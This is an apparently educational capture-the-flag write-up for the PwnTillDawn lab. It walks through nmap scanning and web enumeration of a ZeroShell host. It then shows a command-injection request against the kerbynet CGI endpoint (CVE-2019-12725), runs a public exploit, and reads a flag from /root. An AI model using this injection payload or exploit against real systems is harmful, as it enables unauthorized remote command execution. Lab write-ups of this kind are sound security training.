# PwntillDawn 

## 🔍 Reconnaissance

* Target IP: 10.150.150.150

Initial scan using Nmap:

```bash
nmap -sP 10.150.150.150
```

## 📡 Port Scanning

Performed a service and version detection scan using Nmap:

```bash
nmap -sV 10.150.150.150
```

### 🔍 Results

```bash
Starting Nmap 7.95 ( https://nmap.org ) at XXXX-XX-XX
Nmap scan report for 10.150.150.150
Host is up (0.XXXs latency).
Not shown: 998 closed ports

PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd
443/tcp open  https   Apache httpd (SSL)

Service Info: OS: Linux
```

### 🧠 Analysis

* Ports **80** and **443** are open, indicating a web server is running.
* The service appears to be **Apache HTTP Server**.
* This suggests the attack surface is focused on web-based vulnerabilities.

---

## 🌐 Web Enumeration

Checked the web service using curl:

```bash
curl -k https://10.150.150.150
```

### 🔍 Results

```bash
<HTML content showing ZeroShell web interface>
```

### 🧠 Analysis

* The web application appears to be running **ZeroShell**.
* Indicates a potential web-based attack surface.

---

## 🔎 Directory Enumeration

Used Gobuster to discover hidden directories:

```bash
gobuster dir -u https://10.150.150.150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

### 🔍 Results

```bash
No significant directories discovered
```

### 🧠 Analysis

* No useful directories found via brute force.
* Suggests vulnerability may exist in parameters instead.

---

## 🧪 Manual Testing

Tested web parameters using curl:

```bash
curl -k "https://10.150.150.150/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='id'"
```

### 🔍 Results

```bash
uid=1000(apache) gid=1000(apache) groups=1000(apache)
```

### 🧠 Analysis

* Command execution output confirms **command injection vulnerability**.
* The application is executing system commands via user input.

---

## 💥 Exploitation

Searched for public exploit:

```bash
searchsploit zeroshell
```

### 🔍 Results

```bash
ZeroShell 3.9.0 - Remote Command Execution (CVE-2019-12725)
```

Executed exploit:

```bash
python2 49862.py -u https://10.150.150.150/
```

### 🔍 Results

```bash
[+] Success connect to target
[+] Trying to execute command in ZeroShell OS...
```

### 🧠 Analysis

* Successfully gained remote command execution.
* Exploit automates command injection via vulnerable endpoint.

---

## 🖥️ Initial Access

Executed commands through the exploit:

```bash
id
```

### 🔍 Results

```bash
uid=1000(apache) gid=1000(apache) groups=1000(apache)
```

Confirmed user:

```bash
whoami
```

```bash
apache
```

### 🧠 Analysis

* Initial access obtained as low-privileged user `apache`.

---

## 📂 Post-Exploitation

Enumerated sensitive directories:

```bash
ls /root
```

### 🔍 Results

```bash
FLAG1
kerbynet.cgi
```

### 🧠 Analysis

* Access to `/root` directory indicates misconfiguration.
* Sensitive files are accessible.

---

## 🚩 Flag Retrieval

Read the flag file:

```bash
cat /root/FLAG1
```

### 🔍 Results

```bash
justcopythisstring
```

### 🧠 Analysis

* Successfully retrieved the flag.
* Confirms full compromise of the system.

---
